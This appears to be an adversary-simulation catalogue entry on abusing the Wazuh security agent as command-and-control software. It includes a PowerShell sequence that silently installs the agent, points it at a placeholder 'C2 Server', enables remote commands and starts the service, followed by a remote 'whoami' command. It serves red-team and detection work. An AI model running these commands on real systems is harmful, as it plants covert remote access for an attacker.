---
title: Wazuh
tags:
  - C2
  - Execution
references:
- https://securelist.com/miner-campaign-misuses-open-source-siem-agent/114022/
- https://documentation.wazuh.com/current/quickstart.html
files: []
---

Wazuh is a security platform that provides unified XDR and SIEM protection for endpoints and cloud workloads. The solution is composed of a single universal agent and three central components: the Wazuh server, the Wazuh indexer, and the Wazuh dashboard. 

## C2 Connection
### Description

Wazuh can be downloaded (or transfered) and installed on a system, configured for communication with a specified C2 server. Once Wazuh has remote command execution enabled and the service is started, the agent is ready for command and control operations.

### Simulation
```
powershell.exe Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.5.3-1.msi -OutFile ${env:tmp}\wazuh-agent-4.5.3-1.msi; 
msiexec.exe /i ${env:tmp}\wazuh-agent-4.5.3-1.msi /q WAZUH_MANAGER='C2 Server' WAZUH_REGISTRATION_SERVER='C2 Server' WAZUH_AGENT_GROUP='1'; 
Start-Sleep -Seconds 20;
Add-Content -Path 'C:\Program Files (x86)\ossec-agent\local_internal_options.conf' -Value 'wazuh_command.remote_commands=1'; 
Add-Content -Path 'C:\Program Files (x86)\ossec-agent\local_internal_options.conf' -Value 'logcollector.remote_commands=1'; 
NET START WazuhSvc
```

### MITRE ATT&CK

T1105: Ingress Tool Transfer
T1219: Remote Access Software

### Detections



## Remote Command Execution
### Description

Once the agent is connected to the "C2" server, the agent allows an adversary to execute commands

### Simulation
```
/var/ossec/bin/agent-control -R 'whoami'
```

### MITRE ATT&CK

T1059: Command and Scripting Interpreter
T1219: Remote Access Software

### Detections

